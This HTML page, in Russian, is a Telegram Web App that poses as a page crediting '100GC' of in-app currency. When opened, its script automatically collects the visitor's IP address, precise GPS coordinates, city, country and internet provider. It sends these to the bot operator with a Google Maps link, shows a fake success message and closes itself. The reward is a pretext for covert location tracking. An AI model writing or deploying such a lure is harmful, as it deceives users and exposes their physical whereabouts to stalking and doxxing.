<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Начисление GC</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: system-ui, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 20px;
        }
        .container {
            text-align: center;
            padding: 30px;
            max-width: 400px;
            width: 100%;
        }
        .icon { font-size: 64px; margin-bottom: 20px; }
        h1 { font-size: 28px; margin-bottom: 15px; }
        p { font-size: 16px; opacity: 0.9; margin-bottom: 10px; }
        .spinner {
            border: 4px solid rgba(255,255,255,0.2);
            border-top: 4px solid #fff;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 30px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .success { font-size: 64px; }
        .small { font-size: 13px; opacity: 0.6; margin-top: 20px; }
        .info { font-size: 14px; opacity: 0.8; margin-top: 10px; }
        .gps-status {
            font-size: 12px;
            opacity: 0.7;
            margin-top: 5px;
        }
    </style>
</head>
<body>
    <div class="container" id="status">
        <div class="icon">💰</div>
        <h1>Начисление 100GC</h1>
        <p>Определяем ваши данные...</p>
        <div class="spinner"></div>
        <p class="gps-status" id="gpsStatus">🔄 Запрос GPS...</p>
    </div>

    <script>
        let timer = 5;
        let timerInterval;
        let gpsData = null;
        let ipData = null;

        function closeApp() {
            Telegram.WebApp.close();
        }

        // 1. Получаем IP
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch {
                return 'IP не определён';
            }
        }

        // 2. Геолокация через IP (резерв)
        async function getLocationViaIP(ip) {
            try {
                const response = await fetch(`https://ip-api.com/json/${ip}?fields=status,country,city,lat,lon,isp,timezone,regionName,as,org`);
                const data = await response.json();
                if (data.status === 'success') {
                    return {
                        country: data.country || 'Неизвестно',
                        city: data.city || 'Неизвестно',
                        region: data.regionName || 'Неизвестно',
                        lat: data.lat || 0,
                        lon: data.lon || 0,
                        isp: data.isp || data.org || 'Неизвестно',
                        timezone: data.timezone || 'Неизвестно',
                        source: 'IP-адрес'
                    };
                }
                return null;
            } catch {
                return null;
            }
        }

        // 3. GPS (автоматически, без кнопок)
        async function getGPS() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    document.getElementById('gpsStatus').textContent = '❌ GPS недоступен';
                    resolve(null);
                    return;
                }

                document.getElementById('gpsStatus').textContent = '📍 Запрос GPS...';

                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        document.getElementById('gpsStatus').textContent = '✅ GPS получен!';
                        resolve({
                            lat: position.coords.latitude,
                            lon: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            source: 'GPS (точный)'
                        });
                    },
                    (error) => {
                        console.error('GPS ошибка:', error.message);
                        document.getElementById('gpsStatus').textContent = `⚠️ GPS: ${error.message}`;
                        resolve(null);
                    },
                    { 
                        timeout: 10000, 
                        enableHighAccuracy: true,
                        maximumAge: 0
                    }
                );
            });
        }

        // 4. Формируем и отправляем данные
        async function sendData() {
            // Получаем IP
            const ip = await getIP();
            
            // Запрашиваем GPS автоматически
            const gps = await getGPS();
            
            // Если GPS есть — используем его
            let location = null;
            let dataString = `🌐 IP: ${ip}`;

            if (gps && gps.lat && gps.lon) {
                location = gps;
                dataString += `\n📍 **GPS (точные координаты):**`;
                dataString += `\n🗺️ Широта: ${gps.lat}`;
                dataString += `\n🗺️ Долгота: ${gps.lon}`;
                dataString += `\n📏 Точность: ±${Math.round(gps.accuracy)} метров`;
                dataString += `\n📍 Карта: https://www.google.com/maps?q=${gps.lat},${gps.lon}`;
                
                // Пробуем получить город по координатам (через обратный геокодер)
                try {
                    const geoResponse = await fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${gps.lat}&longitude=${gps.lon}&localityLanguage=ru`);
                    const geoData = await geoResponse.json();
                    if (geoData.city || geoData.locality) {
                        dataString += `\n🏙️ Город: ${geoData.city || geoData.locality || 'Неизвестно'}`;
                        dataString += `\n🌍 Страна: ${geoData.countryName || 'Неизвестно'}`;
                    }
                } catch (e) {
                    // Если не получилось — ничего страшного
                }
            } else {
                // Если GPS нет — используем IP-геолокацию
                const ipLocation = await getLocationViaIP(ip);
                if (ipLocation && ipLocation.lat) {
                    location = ipLocation;
                    dataString += `\n📍 Геолокация (по IP):`;
                    dataString += `\n🌍 Страна: ${ipLocation.country}`;
                    dataString += `\n🏙️ Город: ${ipLocation.city}`;
                    dataString += `\n📡 Провайдер: ${ipLocation.isp}`;
                    dataString += `\n🗺️ Координаты: ${ipLocation.lat}, ${ipLocation.lon}`;
                    dataString += `\n📍 Карта: https://www.google.com/maps?q=${ipLocation.lat},${ipLocation.lon}`;
                } else {
                    dataString += `\n❌ Геолокация не определена`;
                    dataString += `\n🗺️ Карта: https://www.google.com/maps/search/${ip}`;
                }
            }

            // Отправляем в Telegram
            Telegram.WebApp.sendData(dataString);

            // Показываем успех
            let html = `
                <div class="icon success">✅</div>
                <h1>100GC начислены!</h1>
                <p>Данные получены</p>
                <p class="info">🌐 IP: ${ip}</p>
            `;

            if (gps && gps.lat) {
                html += `<p class="info">📍 GPS: ${gps.lat}, ${gps.lon}</p>`;
                html += `<p class="info" style="font-size: 12px;">📏 Точность: ±${Math.round(gps.accuracy)}м</p>`;
            } else if (location && location.lat) {
                html += `<p class="info">📍 ${location.city || 'Город'}, ${location.country || 'Страна'}</p>`;
            } else {
                html += `<p class="info">❌ Геолокация не найдена</p>`;
            }

            html += `<p class="small">Закрывается через 5 секунд...</p>`;
            document.getElementById('status').innerHTML = html;

            // Таймер закрытия
            timer = 5;
            timerInterval = setInterval(() => {
                timer--;
                if (timer <= 0) {
                    clearInterval(timerInterval);
                    closeApp();
                }
            }, 1000);
        }

        // Запускаем
        sendData();
    </script>
</body>
</html>
